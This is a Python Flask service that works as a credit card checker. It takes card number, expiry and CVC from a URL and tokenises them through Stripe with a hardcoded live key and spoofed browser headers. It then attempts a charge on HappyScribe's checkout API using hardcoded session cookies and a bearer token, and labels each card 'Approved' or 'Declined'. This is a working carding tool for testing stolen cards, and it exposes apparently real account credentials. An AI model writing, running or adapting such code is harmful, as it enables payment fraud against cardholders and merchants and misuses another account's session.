from user_agent import generate_user_agent
import requests
from flask import Flask

app = Flask(__name__)

@app.route('/check/<ccx>')
def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")[:4]

    if "20" in yy:
        yy = yy.split("20")[1]

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&billing_details[name]=JOKERT&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=8313867e-642b-45f1-a1ac-8d16e62b2804f1eeb1&muid=f4fe562c-c20a-495a-ae53-c7f98af7fd7796a997&sid=885656e7-3f03-400b-8506-a306d215a0fd8a73a8&pasted_fields=number&payment_user_agent=stripe.js%2F20e004c1e5%3B+stripe-js-v3%2F20e004c1e5&time_on_page=235334&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    try:
        id = response.json()['id']
    except KeyError:
        return 'Error processing payment.'

    cookies = {
    'ahoy_visitor': '3aae0976-e23a-4dba-8b36-8472d208de39',
    '_gcl_au': '1.1.589615022.1686364822',
    '_gid': 'GA1.2.612414710.1686364822',
    '_lfa': 'LF1.1.33f2f8d8020e1717.1686364822829',
    '_fbp': 'fb.1.1686364827355.914507822',
    'cookieconsent_status': 'dismiss',
    'intercom-device-id-frdatdus': '880e973e-b4f6-4a1b-bda6-5c8c42734d2b',
    '__stripe_mid': 'ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd',
    'ahoy_visit': '6daa3b7e-b32a-4535-a6c8-a3d04e9480c3',
    '_uetsid': '25876ee0073811ee82092b2ec7ac516d',
    '_uetvid': '25886a50073811eeb998adc6e5b32b9c',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e',
    'unsecure_is_signed_in': '1',
    '_ga_4T8KCV9Y2D': 'GS1.1.1686415944.3.1.1686416484.0.0.0',
    '_ga': 'GA1.1.1778485401.1686364822',
    'intercom-session-frdatdus': 'ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6',
    '_transcribe_session': '9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
}

    headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': 'Bearer I5PqUERRXMbQyALPKtQFzQtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=3aae0976-e23a-4dba-8b36-8472d208de39; _gcl_au=1.1.589615022.1686364822; _gid=GA1.2.612414710.1686364822; _lfa=LF1.1.33f2f8d8020e1717.1686364822829; _fbp=fb.1.1686364827355.914507822; cookieconsent_status=dismiss; intercom-device-id-frdatdus=880e973e-b4f6-4a1b-bda6-5c8c42734d2b; __stripe_mid=ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd; ahoy_visit=6daa3b7e-b32a-4535-a6c8-a3d04e9480c3; _uetsid=25876ee0073811ee82092b2ec7ac516d; _uetvid=25886a50073811eeb998adc6e5b32b9c; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e; unsecure_is_signed_in=1; _ga_4T8KCV9Y2D=GS1.1.1686415944.3.1.1686416484.0.0.0; _ga=GA1.1.1778485401.1686364822; intercom-session-frdatdus=ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6; _transcribe_session=9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/7592712/checkout?plan=slider_prepaid&hours=1',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}

    json_data = {
        'id': 7271786,
        'address': 'NEW YORK',
        'name': 'JOhdjkdR',
        'country': 'US',
        'vat': None,
        'billing_account_id': 7271786,
        'orderReference': 'orrbctwnb',
        'user_id': 7661625,
        'organization_id': 7592712,
        'hours': 1,
        'balance_increase_in_cents': None,
        'payment_method_id': id,
        'transcription_id': None,
        'plan': 'slider_prepaid',
        'order_id': None,
        'recurrence_interval': None,
        'extra_plan_hours': None,
    }

    response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
    print(response.json())
    
    try:
        if "Your card was declined" in response.text:
        	msg = '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌ -  - Your Card Was Declined'
        	
     #       data = f"#Dec - {ccx} - {response}"
    #        return data
        	Status = False
        elif "Your card number is incorrect." in response.text:
        	msg = '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌-  - Your card number is incorrect.'
        else:
            msg = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ - - Payment Successfull.'
            Status = False
          #  sata = f"#Live - {ccx} - {response}"
     #       return sata
         #   print(response.json()['error'])
     #       print('Dec')
    
    except:
        fata = f"#Hata - {ccx} - {response}"
        return fata
    data = msg
    return data
     #   print(response.text)
       # print('bos')

 #   return response.json()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
